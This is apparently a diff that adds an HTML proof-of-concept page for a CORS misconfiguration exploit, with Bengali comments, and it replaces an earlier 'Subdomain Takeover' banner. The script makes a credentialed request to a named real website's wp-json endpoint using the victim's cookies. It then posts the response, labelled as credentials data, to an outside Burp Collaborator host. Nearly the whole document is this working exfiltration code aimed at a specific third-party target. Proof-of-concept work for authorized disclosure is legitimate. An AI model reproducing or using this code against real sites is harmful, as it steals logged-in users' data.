@@ -1,5 +1,98 @@
-<header style="background:#111827;color:#fff;padding:24px;text-align:center;font-family:Arial,sans-serif;">
-  <h1>Subdomain Takeover — HACKER BY HUNT</h1>
-  <p>Successfully demonstrated on an authorized test environment.</p>
-</header>
- 
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Advanced CORS Exploit PoC</title>
+    <style>
+        body { font-family: Arial, sans-serif; margin: 30px; background-color: #f4f4f9; }
+        .container { max-width: 700px; background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
+        button { background-color: #d9534f; color: white; border: none; padding: 10px 20px; font-size: 16px; border-radius: 4px; cursor: pointer; }
+        button:hover { background-color: #c9302c; }
+        pre { background: #272822; color: #f8f8f2; padding: 15px; border-radius: 5px; overflow-x: auto; font-family: monospace; }
+        .status { font-weight: bold; color: #5cb85c; }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <h2>CORS Misconfiguration Exploit (JSON Credentials Extraction)</h2>
+    <p>Click the button below to simulate the Cross-Origin attack.</p>
+    
+    <button type="button" onclick="exploitCORS()">Exploit & Extract JSON</button>
+    
+    <p>Attack Status: <span id="status" class="status">Waiting for user interaction...</span></p>
+    
+    <h3>Extracted Target JSON Data:</h3>
+    <pre id="output">JSON data will be displayed here after successful extraction...</pre>
+</div>
+
+<script>
+function exploitCORS() {
+    // ----------------- CONFIGURATION -----------------
+    var targetUrl = "https://nxtport.com/wp-json"; 
+    
+    // আপনার সচল Burp Collaborator বা ওএসটি লিঙ্কটি এখানে বসান
+    var collaboratorUrl = "http://0qrfqiy3311al7nim7giqd8s5jbhzjn8.oastify.com"; 
+    // -------------------------------------------------
+
+    var statusElement = document.getElementById("status");
+    var outputElement = document.getElementById("output");
+    
+    statusElement.innerText = "Sending exploit request...";
+
+    // ১. টার্গেট ডোমেইন থেকে ক্রেডেনশিয়াল সহ JSON ডেটা রিড করার জন্য প্রথম XMLHttpRequest
+    var xhr = new XMLHttpRequest();
+    xhr.open("GET", targetUrl, true);
+    xhr.withCredentials = true; // ভিকটিমের কুকি/সেশন ব্যবহারের জন্য বাধ্যতামূলক
+
+    xhr.onreadystatechange = function() {
+        if (xhr.readyState == 4) {
+            if (xhr.status == 200) {
+                statusElement.innerText = "Exploit Successful! JSON Extracted.";
+                
+                // জেসন টেক্সট ডাটা ক্যাপচার
+                var jsonResponse = xhr.responseText;
+                
+                // ব্রাউজার স্ক্রিনে সুন্দর করে দেখানোর জন্য (Pretty Print)
+                try {
+                    var parsedJson = JSON.parse(jsonResponse);
+                    outputElement.innerText = JSON.stringify(parsedJson, null, 2);
+                } catch(e) {
+                    outputElement.innerText = jsonResponse; // পার্স না হলে র টেক্সট দেখাবে
+                }
+
+                // ২. সংগৃহীত সম্পূর্ণ JSON ডেটা কোলাবোরেটরে পাঠানোর জন্য দ্বিতীয় XMLHttpRequest (POST)
+                if (collaboratorUrl) {
+                    var xhr2 = new XMLHttpRequest();
+                    xhr2.open("POST", collaboratorUrl, true);
+                    
+                    // -------------------------------------------------
+                    // পরিবর্তন: কোলাবোরেটর ইউআরএলের ক্রেডেনশিয়াল রিকোয়েস্ট সক্রিয় করা হলো
+                    xhr2.withCredentials = true; 
+                    // -------------------------------------------------
+                    
+                    xhr2.setRequestHeader("Content-Type", "application/json");
+                    
+                    // পিওর জেসন স্ট্রাকচারে কোলাবোরেটরে এক্সফিল্ট্রেট করা হচ্ছে
+                    var payload = {
+                        "vulnerability": "CORS Misconfiguration Confirmed",
+                        "exfiltrated_from": targetUrl,
+                        "credentials_data": jsonResponse
+                    };
+                    
+                    xhr2.send(JSON.stringify(payload));
+                    console.log("[+] Full JSON credentials sent to collaborator!");
+                }
+            } else {
+                statusElement.style.color = "#d9534f";
+                statusElement.innerText = "Failed with HTTP Status: " + xhr.status;
+                outputElement.innerText = "CORS policy blocked the request or domain is not vulnerable.";
+            }
+        }
+    };
+
+    xhr.send();
+}
+</script>
+
+</body>
+</html>
